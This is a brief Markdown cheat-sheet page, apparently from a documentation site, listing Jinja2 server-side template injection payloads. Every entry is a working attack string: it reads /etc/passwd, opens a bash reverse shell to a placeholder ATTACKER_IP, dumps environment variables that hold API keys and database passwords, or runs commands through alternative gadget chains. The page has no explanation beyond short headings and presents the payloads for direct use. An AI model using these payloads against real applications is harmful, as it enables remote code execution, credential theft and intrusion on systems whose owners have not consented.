---
title: "SSTI"
weight: 1
# bookFlatSection: false
# bookToc: true
# bookHidden: false
# bookCollapseSection: false
# bookComments: false
# bookSearchExclude: false
# bookHref: ''
# bookIcon: ''
---

# Read /etc/passwd
{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}

# Reverse shell
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read() }}

# Exfiltrate environment variables (API keys, DB passwords)
{{ cycler.__init__.__globals__.os.popen('env').read() }}

# Alternative chains (if cycler is unavailable)
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}